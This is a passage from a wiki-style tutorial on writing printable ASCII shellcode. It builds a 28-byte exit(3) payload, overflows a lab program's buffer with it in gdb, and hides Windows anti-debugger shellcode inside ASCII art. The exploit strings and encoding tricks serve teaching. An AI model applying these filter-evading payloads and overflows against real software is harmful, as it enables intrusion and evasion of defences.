<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1">decl <span class="sy0">%</span><span class="kw3">eax</span></pre></div></div>
</td>
<td> H
</td></tr></table>
<p>Once jjX4jH has been run, eax must be set to 0xffffffff.  Now, determining what the target xor should be:
</p>
<pre> FFFF xor
 80CD = 
----------
 7F32
</pre>
<ul><li> Now due to the way xor works, find two ascii sequences that can be assumed when xor'd together, come out to 0x7f32:
</li></ul>
<table class="wikitable">
<tr>
<th> <a href="/Assembly_Basics" title="Assembly Basics" class="mw-redirect">Assembly</a>
</th>
<th> <a href="/Machine_code" title="Machine code">Machine Code</a>
</th>
<th> Ascii
</th></tr>
<tr>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">xor</span> $<span class="nu0">0x4f65</span><span class="sy0">,</span> <span class="sy0">%</span><span class="kw3">ax</span></pre></div></div>
</td>
<td> \x66\x35\x4f\x65
</td>
<td> f5Oe
</td></tr>
<tr>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">xor</span> $<span class="nu0">0x3057</span><span class="sy0">,</span> <span class="sy0">%</span><span class="kw3">ax</span></pre></div></div>
</td>
<td> \x66\x35\x30\x57
</td>
<td> f50W
</td></tr>
<tr>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1">pushl <span class="sy0">%</span><span class="kw3">eax</span></pre></div></div>
</td>
<td> \x50
</td>
<td> P
</td></tr></table>
<ul><li> And all put together, the ascii code for getting \xcd\x80 onto the stack in the correct order looks like "jjX4jHf5Oef50WP".
</li></ul>
<h4> <span class="mw-headline" id="The_Code">The Code</span></h4>
<p>The first thing to be done is add to ESP. Find out how many bytes to be added by adding up all this shellcode.  So far, there is "jjX4jHf5Oef50WP" and "j0X43P[HH" to <a href="#The_Kernel_Interrupt">push \xcd\x80</a> onto the stack, and using stack space,  <a href="#eax_.26_ebx">set&#160;%eax to 1 and&#160;%ebx to 3</a>.  The next problem in the equation is the reliance on push to apply values, and pushed instructions (\xcd\x80) onto the stack with the first bit, which could get overwritten or have instructions written in front of it. Now all of these things need to be tied together along with the knowledge of <a href="/Assembly_Basics#Overflows" title="Assembly Basics" class="mw-redirect">the stack</a> to ensure proper execution of the code.
</p>
<table class="wikitable" width="100%">
<tr>
<td>
<p><b>There are multiple solutions to this</b>:
</p>
<ul><li> Overwriting a dword (or more memory) between the currently executing code and yet-to-be-executed code with nops after its been used for the stack.  
</li><li> Add 8 to esp every time a piece of code is decoded and pushed to the stack, so that unpacking code will unpack forwards rather than backwards.
</li></ul>
</td></tr></table>
<p><i>In this example, 8 is added to&#160;%esp by popping an arbitrary register that the code doesn't care about.  In this case, the arbitrary register is&#160;%edx.  So once the exit code has been written,&#160;%edx is popped twice to add 8 to&#160;%esp.  This will not only prevent us from overwriting the exit code with a single push instruction, but also prevents single-push instructions from overwriting code between executing code and the freshly unpacked the exit code.</i>
</p><p><br />
<b>In review:</b>
</p>
<ul><li> The stack pointer (%esp) must be set to the value of the shellcode's length in bytes above the instruction pointer (%eip)
</li><li> The stack will need to be manipulated properly to avoid overwriting reconstructed instructions.
</li></ul>
<p>To align the stack pointer, a combination of the popad instruction and pop register instructions will be used to ensure the smallest possible code.  Assuming that&#160;%eip =&#160;%esp at the time of the code's execution (it rarely will) the smallest possible code is 28 bytes:
</p>
<pre> <b>aPjjX4jHf5eOf5W0PZZj0X43P[HH</b>
</pre>
<p>Examining what's going on here:
</p>
<table class="wikitable">
<tr>
<th> <a href="/Assembly_Basics" title="Assembly Basics" class="mw-redirect">Assembly</a>
</th>
<th> <a href="/Machine_code" title="Machine code">Machine Code</a>
</th>
<th> Ascii
</th>
<th> Comment
</th></tr>
<tr>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">popa</span></pre></div></div>
</td>
<td> \x61
</td>
<td> a
</td>
<td> Used to align&#160;%esp 32 bytes ahead - 4 bytes from the end of the shellcode
</td></tr>
<tr>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1">pushl <span class="sy0">%</span><span class="kw3">eax</span></pre></div></div>
</td>
<td> \x50
</td>
<td> P
</td>
<td> Used to subtract 4 from&#160;%esp to align it immediately after the code
</td></tr>
<tr>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1">pushb $<span class="nu0">0x6a</span></pre></div></div>
</td>
<td> \x6a\x6a
</td>
<td> jj
</td>
<td> put $0x6a on the stack
</td></tr>
<tr>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">pop</span> <span class="sy0">%</span><span class="kw3">eax</span></pre></div></div>
</td>
<td> \x58
</td>
<td> X
</td>
<td>&#160;%eax is set to 0x6a
</td></tr>
<tr>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1">xorb <span class="nu0">0x6a</span><span class="sy0">,</span> <span class="sy0">%</span><span class="kw3">al</span></pre></div></div>
</td>
<td> \x34\x6a
</td>
<td> 4j
</td>
<td> Zero out&#160;%eax
</td></tr>
<tr>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1">decl <span class="sy0">%</span><span class="kw3">eax</span></pre></div></div>
</td>
<td> \x48
</td>
<td> H
</td>
<td>&#160;%eax is now set to 0xffffffff so \xcd\x80 can be used with xor
</td></tr>
<tr>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">xor</span> $<span class="nu0">0x4f65</span><span class="sy0">,</span> <span class="sy0">%</span><span class="kw3">ax</span></pre></div></div>
</td>
<td> \x66\x35\x65\x4F
</td>
<td> f5eO
</td>
<td> Our first round of xor
</td></tr>
<tr>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">xor</span> $<span class="nu0">0x3057</span><span class="sy0">,</span> <span class="sy0">%</span><span class="kw3">ax</span></pre></div></div>
</td>
<td> \x66\x35\x57\x30
</td>
<td> f5W0
</td>
<td> Sets&#160;%eax to 0xffff80cd
</td></tr>
<tr>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">push</span> <span class="sy0">%</span><span class="kw3">eax</span></pre></div></div>
</td>
<td> \x50
</td>
<td> P
</td>
<td> Makes \xcd\x80\xff\xff hit the stack
</td></tr>
<tr>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">pop</span> <span class="sy0">%</span><span class="kw3">edx</span></pre></div></div>
</td>
<td> \x5a
</td>
<td> Z
</td>
<td> Used to add 4 to&#160;%esp, because&#160;%edx does not matter for the code.
</td></tr>
<tr>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">pop</span> <span class="sy0">%</span><span class="kw3">edx</span></pre></div></div>
</td>
<td> \x5a
</td>
<td> Z
</td>
<td> Add 4 more to&#160;%esp, now past the code for exit constructed in front of the code
</td></tr>
<tr>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1">pushb $<span class="nu0">0x30</span></pre></div></div>
</td>
<td> \x6a\x30
</td>
<td> j0
</td>
<td> Set up to set ebx = 3
</td></tr>
<tr>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">pop</span> <span class="sy0">%</span><span class="kw3">eax</span></pre></div></div>
</td>
<td> \x58
</td>
<td> X
</td>
<td>&#160;%eax = $0x30
</td></tr>
<tr>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">xor</span> $<span class="nu0">0x33</span><span class="sy0">,</span> <span class="sy0">%</span><span class="kw3">al</span></pre></div></div>
</td>
<td> \x34\x33
</td>
<td> 43
</td>
<td> set&#160;%eax to 3 for moving it into&#160;%ebx
</td></tr>
<tr>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">push</span> <span class="sy0">%</span><span class="kw3">eax</span></pre></div></div>
</td>
<td> \x50
</td>
<td> P
</td>
<td> push 0x00000003 onto the stack, ahead of the interrupt sequence
</td></tr>
<tr>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">pop</span> <span class="sy0">%</span><span class="kw3">ebx</span></pre></div></div>
</td>
<td> \x5b
</td>
<td> [
</td>
<td> Set the exit code to '3' by the value off of the stack into&#160;%ebx
</td></tr>
<tr>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1">decl <span class="sy0">%</span><span class="kw3">eax</span></pre></div></div>
</td>
<td> \x48
</td>
<td> H
</td>
<td> Since 3 was stored in&#160;%eax as well as&#160;%ebx,&#160;%eax is then decremented twice to get 1.
</td></tr>
<tr>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1">decl <span class="sy0">%</span><span class="kw3">eax</span></pre></div></div>
</td>
<td> \x48
</td>
<td> H
</td>
<td>&#160;%eax is 1,&#160;%ebx is 3.  The next bytes have been overwritten with <a href="/Machine_code" title="Machine code">machine code</a> for <b>int $0x80</b>.
</td></tr></table>
<ul><li>Now this needs to be converted to ascii to be  put onto the stack.  The preferred method to do this is by using "strings" against the generated object file.  Save the above code in a file called payload.s, assemble it with 'as' and run strings on payload.o, as follows:
</li></ul>
<pre> [user@host ~]$ as payload.s --32 -o payload.o
 [user@host ~]$ strings payload.o 
 aPjjX4jHf5eOf5W0PZZj0X43P[HH
</pre>
<ul><li>And to make sure its 28 bytes:
</li></ul>
<pre> [user@host ~]$ echo -n $(strings payload.o)|wc
   1       1      28
</pre>
<h3> <span class="mw-headline" id="Testing_Our_Code">Testing Our Code</span></h3>
<p>Stack dumps in this segment have been shortened for brevity and readability.
</p>
<h4> <span class="mw-headline" id="Analyzing_the_Buffer">Analyzing the Buffer</span></h4>
<table style="background: #F8F8FF; border: 2px solid #8888AA; width: 90%; margin: 5px auto; border-radius: 10px; -moz-border-radius: 10px; -webkit-border-radius: 10px; -khtml-border-radius: 10px; -icab-border-radius: 10px; -o-border-radius: 10px;">
<tr>
<td width="1%" style="padding-right:1em;"><img src="http://i.imgur.com/c3el4.png" alt="c3el4.png" />
</td>
<td>Using the <b>bof.c</b> example from <a href="/Buffer_Overflows#bof.c" title="Buffer Overflows" class="mw-redirect">buffer overflows</a>, there is a 100 byte buffer.
</td></tr></table>
<ul><li> Lets start with 116 "A" characters to isolate the return pointer:
</li></ul>
<pre>[hatter@eclipse ~]$ gdb -q ./bof
Reading symbols from /home/hatter/bof...(no debugging symbols found)...done.
(gdb) break main
Breakpoint 1 at 0x80483e7
(gdb) r `perl -e 'print "A"x116'`
Starting program: /home/hatter/bof `perl -e 'print "A"x116'`
(gdb) x/200x $esp
<b>0xbffff538</b>:     0x00000000      0xb7e35483      0x00000002      0xbffff5d4
</pre>
<ul><li> Notice that&#160;%esp is aligned at 0xbffff538.  Skipping to the end, the code starts appearing at 0xbffff748.
</li></ul>
<pre>0xbffff738:     0x41410066      0x41414141      0x41414141      0x41414141
<b>0xbffff748</b>:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff758:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff768:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff778:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff788:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff798:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff7a8:     0x41414141      0x58004141      0x445f4744      0x5f415441
</pre>
<ul><li> A little bit of hex math will tell us that 0x748 - 0x538 = 0x1f0 (or 496 in decimal).  Dividing this by 32 gives us the decimal value '15'.  If moving directly to 0xbffff748, 18 bytes of code will have been skipped. To round it off, make sure there are 32 "A" characters at the beginning.  So, if the code is to be executed properly, at least 16 'popa' instructions are required to get&#160;%esp to point to the code.  So, lets do just a little more math here.  Lets start with the 32 'A' characters, then 16 'a' characters.  Wait, that adds 16 to the required value of&#160;%esp, so, two more 'a' (for a total of 18) characters are required and a trailing 34 bytes of nop's before the return pointer.
</li></ul>
<h4> <span class="mw-headline" id="A_Successful_Overflow">A Successful Overflow</span></h4>
<table style="background: #F8F8FF; border: 2px solid #8888AA; width: 90%; margin: 5px auto; border-radius: 10px; -moz-border-radius: 10px; -webkit-border-radius: 10px; -khtml-border-radius: 10px; -icab-border-radius: 10px; -o-border-radius: 10px;">
<tr>
<td width="1%" style="padding-right:1em;"><img src="http://i.imgur.com/c3el4.png" alt="c3el4.png" />
</td>
<td>In case the reader didn't follow along and skipped straight here, the shellcode is expected to exit(3), so this exit is expected behavior.
</td></tr></table>
<pre><b>[hatter@eclipse ~]$ gdb -q ./bof</b>
<b>Reading symbols from /home/hatter/bof...(no debugging symbols found)...done.</b>
<b>(gdb) break main</b>
<b>Breakpoint 1 at 0x80483e7</b>
<b>(gdb) r `perl -e 'print "A"x32 . "a"x18 . "aPjjX4jHf5eOf5W0PZZj0X43P[HH" . "A"x34 . "\x48\xf7\xff\xbf"'`</b>
<b>Starting program: /home/hatter/bof `perl -e 'print "A"x32 . "a"x18 . "aPjjX4jHf5eOf5W0PZZj0X43P[HH" . "A"x34 . "\x48\xf7\xff\xbf"'`</b>
<b>Breakpoint 1, 0x080483e7 in main ()</b>
<b>(gdb) continue</b>
<b>Continuing.</b>
<b>[Inferior 1 (process 29422) exited with code 03]</b>
</pre>
<p>So here's what happened.  When the code hit 0xbffff748, we added (18 * 32 &#x3d; 576 &#x3d; 0x240) to the&#160;%esp register.  Some quick math explains that 0xbffff538 + 0x240 &#x3d; 778.  An examination of where the code wound up will indicate that&#160;%esp has been successfully set to a value <b>after</b> the shellcode.
</p>
<pre>[user@host ~]$ gdb -q ./bof
Reading symbols from /home/hatter/bof...(no debugging symbols found)...done.
(gdb) break main
Breakpoint 1 at 0x80483e7
(gdb) r `perl -e 'print "A"x32 . "a"x18 . "aPjjX4jHf5eOf5W0PZZj0X43P[HH" . "A"x34 . "\x48\xf7\xff\xbf"'`
Starting program: /home/hatter/bof `perl -e 'print "A"x32 . "a"x18 . "aPjjX4jHf5eOf5W0PZZj0X43P[HH" . "A"x34 . "\x48\xf7\xff\xbf"'`
Breakpoint 1, 0x080483e7 in main ()
(gdb) x/200x $esp
<b>0xbffff538</b>:     0x00000000      0xb7e35483      0x00000002      0xbffff5d4
<b>[Shortened for brevity]</b>
0xbffff738:     0x41410066      0x41414141      0x41414141      0x41414141
<b>0xbffff748</b>:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff758:     0x61614141      0x61616161      0x61616161      0x61616161
0xbffff768:     0x61616161      0x6a6a5061      0x486a3458      0x4f653566
0xbffff778:     0x30573566      0x6a5a5a50      0x33345830      0x48485b50
<b>0xbffff788</b>:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff798:     0x41414141      0x41414141      0x41414141      0x41414141
</pre>
<p>So the offset 0x778 is still inside the shellcode.  That's ok though, the original 'a' or popa at the very beginning of the shellcode sets&#160;%esp to 0xbffff788.  Expirement with this by setting breakpoints at <b>0xbffff788</b> (or the return pointer + 28), and seeing what gets written.  A value of 0xffff80cd will be written right there - and if you step through instruction by instruction, the dword after it will constantly change as its being used for temporary stack space.}}{{protip|<i><b>You can easily modify the exit code by modifying the ascii without having to go through the entire assembly and disassembly process over.</b></i>
</p>
<table class="wikitable" width="100%">
<tr>
<td>
<ul><li> Changing the '3' to '4', and adding an additional <b>decl&#160;%eax</b> with 'H': 
</li></ul>
<pre>(gdb) r `perl -e 'print "A"x32 . "a"x18 . "ajjX4jHf5eOf5W0PZZj0X43P[HH" . "A"x35 . "\x48\xf7\xff\xbf"'`
Starting program: /home/hatter/bof `perl -e 'print "A"x32 . "a"x18 . "ajjX4jHf5eOf5W0PZZj0X4<b>3</b>P[<b>HH</b>" . "A"x35 . "\x48\xf7\xff\xbf"'`
[Inferior 1 (process 17860) exited with code <b>03</b>]
</pre>
<pre>(gdb) r `perl -e 'print "A"x32 . "a"x18 . "ajjX4jHf5eOf5W0PZZj0X44P[HHH" . "A"x34 . "\x48\xf7\xff\xbf"'`
Starting program: /home/hatter/bof `perl -e 'print "A"x32 . "a"x18 . "ajjX4jHf5eOf5W0PZZj0X4<b>4</b>P[<b>HHH</b>" . "A"x34 . "\x48\xf7\xff\xbf"'`
[Inferior 1 (process 18701) exited with code <b>04</b>]
</pre>
</td></tr></table>
<h2> <span class="mw-headline" id="Encoding_Shellcode_:_Ascii_Art"> Encoding Shellcode&#160;: Ascii Art </span></h2>
<p>This is a simple win32 alphanumeric encoded shellcode expanded using <b>jump</b>.  It is also possible to expand polymorphic code in this way, or to write a packer/unpacker that interacts with ascii art.
</p>
<h3> <span class="mw-headline" id="Starting_Shellcode">Starting Shellcode</span></h3>
<p><i>Starting out with Koshi's 14 byte alphanumeric NtGlobalFlags payload:</i>
</p>
<pre> <b>jpXV34dd3v09Fh</b>
</pre>
<p>This payload ends on a CMP, so we'll have to add the jump condition.  If the values are equal, the debugger is present; if the values are not, there is no debugger present.  So, we can use the <b>je</b> byte offset instruction (<b>t</b> in alpha) to maintain printable code.  We'll want to exit if there's a debugger present, else we can continue code execution.
</p>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1">  <span class="kw1">push</span> <span class="st0">'p'</span>                          <span class="co1">;jp</span>
  <span class="kw1">pop</span> <span class="kw3">eax</span>                           <span class="co1">;X</span>
  <span class="kw1">push</span> <span class="kw3">esi</span>                          <span class="co1">;V</span>
  <span class="kw1">xor</span> <span class="kw3">esi</span><span class="sy0">,</span> <span class="kw5">dword</span> <span class="kw4">ptr</span> <span class="kw3">ss</span><span class="sy0">:</span><span class="br0">&#91;</span><span class="kw3">esp</span><span class="br0">&#93;</span>       <span class="co1">;34d  (now contains esi), esi = 0</span>
  <span class="kw1">xor</span> <span class="kw3">esi</span><span class="sy0">,</span> <span class="kw5">dword</span> <span class="kw4">ptr</span> <span class="kw3">ss</span><span class="sy0">:</span><span class="br0">&#91;</span><span class="kw3">esi</span><span class="sy0">+</span><span class="nu0">30</span><span class="br0">&#93;</span>    <span class="co1">;d3v0 (store offset 0x30 into esi)</span>
  <span class="kw1">cmp</span> <span class="kw5">dword</span> <span class="kw4">ptr</span> <span class="kw3">ds</span><span class="sy0">:</span><span class="br0">&#91;</span><span class="kw3">esi</span><span class="sy0">+</span><span class="nu0">68</span><span class="br0">&#93;</span><span class="sy0">,</span> <span class="kw3">eax</span>    <span class="co1">;9Fh  (compare esi pointer offset 0x68 with 0x70.)</span></pre></div></div>
</td></tr></table>
<p>The following must be sequential, and registers must be preserved:
</p>
<ul><li> V34dd4v0 - ESI must be zeroed, NtGlobalflags must be stored in ESI.
</li><li> esi cannot be modified until eax is set to 0x6a/'j' and then 9Fh is run as a comparison.
</li></ul>
<h3> <span class="mw-headline" id="Comparisons_and_Jumps">Comparisons and Jumps</span></h3>
<p>Available comparison operators are a little hacky.  We can compare the eax register to a dword using the '&#x3d;' opcode <b>0x3d</b>, other than that we're limited to the unpredictable x38-0x3b instructions.  For brevity we will use the '&#x3d;' opcode here.  Other available printable comparison operators will be reserved for future instructions, as they get much more complex.
</p>
<ul><li> Suppose we wanted to jump 30 bytes ahead in pure ascii.  The easy way to do this is by setting the value of the eax register to a controllable ascii DWORD.  In this case, we'll use the string 'code':
</li></ul>
<pre> <b>hcodeX&#x3d;codet0</b>
</pre>
<ul><li> Disassembled, this represents:
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1">  <span class="kw1">push</span> <span class="st0">'code'</span>
  <span class="kw1">pop</span>  <span class="sy0">%</span><span class="kw3">eax</span>
  <span class="kw1">cmp</span>  <span class="st0">'code'</span><span class="sy0">,</span> <span class="sy0">%</span><span class="kw3">eax</span>
  <span class="kw1">je</span>   <span class="nu0">0x30</span></pre></div></div>
</td></tr></table>
<h3> <span class="mw-headline" id="The_Ascii_Art"> The Ascii Art </span></h3>
<table style="background: #F8F8FF; border: 2px solid #8888AA; width: 90%; margin: 5px auto; border-radius: 10px; -moz-border-radius: 10px; -webkit-border-radius: 10px; -khtml-border-radius: 10px; -icab-border-radius: 10px; -o-border-radius: 10px;">
<tr>
<td width="1%" style="padding-right:1em;"><img src="http://i.imgur.com/c3el4.png" alt="c3el4.png" />
</td>
<td>This ascii art is 80 bytes wide, so each line is 81 bytes including the newline (0x0a).
</td></tr></table>
<pre>                      oooooooooo.              .o8                             
                      `888'   `Y8b            "888                             
ooo. .oo.    .ooooo.   888      888  .ooooo.   888oooo.  oooo  oooo   .oooooooo
`888P"Y88b  d88' `88b  888      888 d88' `88b  d88' `88b `888  `888  888' `88b 
 888   888  888   888  888      888 888ooo888  888   888  888   888  888   888 
 888   888  888   888  888     d88' 888    .o  888   888  888   888  `88bod8P' 
o888o o888o `Y8bod8P' o888bood8P'   `Y8bod8P'  `Y8bod8P'  `V88V"V8P' `8oooooo. 
                                                                     d"     YD 
                                                                     "Y88888P' 
</pre>
<h3> <span class="mw-headline" id="Jump_Sequencing"> Jump Sequencing </span></h3>
<p>Lets see which lines look the best for code insertion.  The string 'hcodeX=codet0' is 13 bytes.  We can start with a jump to the big string of o's at the top of the 'D' in Debug.  The first 'o' is at row two, column 23.  81 + 23 = 104, or 0x68, the 'h' character:
</p><p><br />
</p>
<pre><b>hcodeX=codeth</b>                                                                  
                      <b>o</b>ooooooooo.              .o8                             
                      `888'   `Y8b            "888                             
ooo. .oo.    .ooooo.   888      888  .ooooo.   888oooo.  oooo  oooo   .oooooooo
`888P"Y88b  d88' `88b  888      888 d88' `88b  d88' `88b `888  `888  888' `88b
 888   888  888   888  888      888 888ooo888  888   888  888   888  888   888
 888   888  888   888  888     d88' 888    .o  888   888  888   888  `88bod8P'
o888o o888o `Y8bod8P' o888bood8P'   `Y8bod8P'  `Y8bod8P'  `V88V"V8P' `8oooooo.
                                                                     d"     YD
                                                                     "Y88888P'
</pre>
<ul><li> We have now jumped to the top of the D.  Going back to the shellcode, as long as we preserve eax, we can jump in the string '=codeth' which is 7 bytes, which lets us squeeze shellcode in spaces.  Using the dword 'code' will actually let us tag the shellcode, serving as a tag on the next line in empty space.  Because we can only jump 122 bytes, we can't get to a part of the ascii art with enough room.  We can solve this problem by finding empty enough space to toss the jump code in, along with a little bit of the necessary shellcode:
</li></ul>
<p><br />
</p>
<pre><b>hcodeX=codeth</b>                                                                  
                      <b>V34d=codet4</b>              .o8                             
   <b>d4v0=codet?</b>        `888'   `Y8b            "888                             
ooo. .oo.    .ooooo.   888      888  .ooooo.   888oooo.  oooo  oooo   .oooooooo
`888P"Y88b  d88' `88b  888      888 d88' `88b  d88' `88b `888  `888  888' `88b
 888   888  888   888  888      888 888ooo888  888   888  888   888  888   888
 888   888  888   888  888     d88' 888    .o  888   888  888   888  `88bod8P'
o888o o888o `Y8bod8P' o888bood8P'   `Y8bod8P'  `Y8bod8P'  `V88V"V8P' `8oooooo.
                                                                     d"     YD
                                                                     "Y88888P'
</pre>
<ul><li> Thee&#160;? mark marks where this current article is at, and all the way through the bit of code to store the PEB value into the&#160;%esi register using the string 'V34dd4v0' while maintaining the ability to jump around.  The next bit of code is going to be tricky.  80 bytes will need to be jumped to land at the top of the 'e'.   From there move to the lower top of the 'n', then to the middle of the 'e'.  From there to the middle of the g to the bottom of the b, create an extra bottom on the D to accentuate, then jump to the bottom of the 'g' when and finished.
</li></ul>
<h3> <span class="mw-headline" id="Ascii_Art_Code"> Ascii Art Code </span></h3>
<pre><b>hcodeX=codeth</b>                                                                  
                      <b>V34d=codet4</b>              .o8                             
   <b>d4v0=codeti</b>        `888'   `Y8b            "888                             
ooo. .oo.    .ooooo.   888      888  <b>=codet.</b>   888oooo.  oooo  oooo   .oooooooo
`88<b>=codetn</b>  d88' `88b  888      888 d88' `88b  d88' `88b `888  `888  888' `88b 
 888   888  888   888  888      888 88<b>=codetk</b>  888   888  888   888  888   888 
 888   888  888   888  888     d88' 888    .o  888   888  888   888  `<b>=codet5'</b> 
o888o o888o `Y8bod8P' o888bood8P'   `Y8bod8P'  `<b>=codet0'</b>  `V88V"V8P' `8oooooo. 
                     <b>=codet|</b>                                         d"     YD 
                                                                     "<b>jpX9Fht?</b>
</pre>
<center><script type="text/javascript">
function toggle() {
   $('#display_text').html($('#hidden_display').html());
   $('#hidetext').html($('#hide_msg').html());
   $('#hidetext').attr('onClick','vape();');
}
function vape() {
   $('#display_text').html('');
   $('#hidetext').html($('#show_msg').html());
   $('#hidetext').attr('onClick','toggle();');
}
</script><div style="width:40%; border: 1px solid #000; padding:0px 0px 0px 0px;">Ascii shellcode is part of a series on <a href="/Exploitation" title="Exploitation" class="mw-redirect">exploitation</a>.<br />
<a id='hidetext' onclick="toggle();"><b>[ CrackMe ]</b></a><br /><div id="display_text"></div></div>
<div id="hidden_display" style="display:none; height:1px; width:1px">
<div style="padding:2px;">
<p><b><a href="/Web_Exploitation" title="Web Exploitation" class="mw-redirect">Web Exploitation</a></b><br />
<a href="/XSS" title="XSS">XSS</a> &#8226; <a href="/SQL_injection" title="SQL injection">SQL injection</a> &#8226; <a href="/CSRF" title="CSRF">CSRF</a> &#8226; <a href="/XSRF" title="XSRF">XSRF</a> &#8226; <a href="/Cookies" title="Cookies">Cookies</a> &#8226; <a href="/File_Inclusion" title="File Inclusion">File Inclusion</a> &#8226; <a href="/Command_Injection" title="Command Injection">Command Injection</a> <br />
<a href="/XSCF" title="XSCF">XSCF</a> &#8226; <a href="/Cold_Fusion_Hacking" title="Cold Fusion Hacking" class="mw-redirect">Cold Fusion Hacking</a> &#8226; <a href="/RoR_Patching#Params_Injection_.26_Mass_Assignment_Abuse" title="RoR Patching">Mass Assignment Abuse</a> &#8226; <a href="/Lfi_autopwn.pl" title="Lfi autopwn.pl">Lfi_autopwn.pl</a> <br />
<a href="/MySql_5_Enumeration" title="MySql 5 Enumeration" class="mw-redirect">Mysql5 Enumerator</a> &#8226; <a href="/Vanguard" title="Vanguard">Vanguard</a>
</p><p><b>Software Exploitation</b><br />
<a href="/Buffer_Overflows" title="Buffer Overflows" class="mw-redirect">Buffer Overflows</a> &#8226; <strong class="selflink">ascii shellcode(32 bit)</strong> &#8226; <a href="/Alphanumeric_shellcode" title="Alphanumeric shellcode" class="mw-redirect">alphanumeric shellcode(64-bit)</a> &#8226; <a href="/Bleeding_Life" title="Bleeding Life">Bleeding Life</a> &#8226; <a href="/Unsafe_string_replacement" title="Unsafe string replacement">Unsafe string replacement</a> &#8226; <a href="/Filter_bypass" title="Filter bypass">filter bypass</a> &#8226; <a href="/IDS_evasion" title="IDS evasion">IDS evasion</a> &#8226; <a href="/Privilege_escalation" title="Privilege escalation">privilege escalation</a>
</p>
</div></div><div style="visibility:hidden;height:1px;width:1px;"><div id="hide_msg" style="visibility:hidden;"><b>[ PatchMe ]</b></div><div id="show_msg" style="visibility:hidden;"><b>[ CrackMe ]</b></div></div></center><center>
<p>
<script type="text/javascript">
function prog_toggle() {
   $('#prog_display_text').html($('#prog_hidden_display').html());
   $('#prog_hidetext').html($('#prog_hide_msg').html());
   $('#prog_hidetext').attr('onClick','prog_vape();');
}
function prog_vape() {
   $('#prog_display_text').html('');
   $('#prog_hidetext').html($('#prog_show_msg').html());
   $('#prog_hidetext').attr('onClick','prog_toggle();');
}
</script>
</p>
<div style="width:40%; border: 1px solid #000;">Ascii shellcode is part of a series on <a href="/Programming" title="Programming" class="mw-redirect">programming</a>.<br />
<a id='prog_hidetext' onclick="prog_toggle();"><b>[ Decompile ]</b></a><br /><div id="prog_display_text"></div>
</div>
<div id="prog_hidden_display" style="display:none; height:1px; width:1px;">
<p><b><a href="/Compiled_languages" title="Compiled languages" class="mw-redirect">Compiled languages</a></b><br />
<a href="/Assembly_Basics" title="Assembly Basics" class="mw-redirect">Assembly</a> &#8226; <a href="/C" title="C">C</a> &#8226; <a href="/CPP" title="CPP">C++</a> 
</p><p><b><a href="/Interpreted_languages" title="Interpreted languages" class="mw-redirect">Interpreted languages</a></b><br />
<a href="/Perl" title="Perl">Perl</a> &#8226; <a href="/Python" title="Python">Python</a> &#8226; <a href="/Ruby" title="Ruby">Ruby</a> &#8226; <a href="/PHP" title="PHP">PHP</a> &#8226; <a href="/LUA" title="LUA">LUA</a> &#8226; <a href="/TCL" title="TCL">TCL</a> &#8226; <a href="/SQL" title="SQL">SQL</a> &#8226; <a href="/JavaScript" title="JavaScript">JavaScript</a> &#8226; <a href="/CSS" title="CSS">CSS</a> &#8226; <a href="/HTML" title="HTML">HTML</a>
</p><p><b><a href="/Assembly" title="Assembly">Assembly</a> &amp; <a href="/Shellcode" title="Shellcode" class="mw-redirect">shellcode</a></b><br />
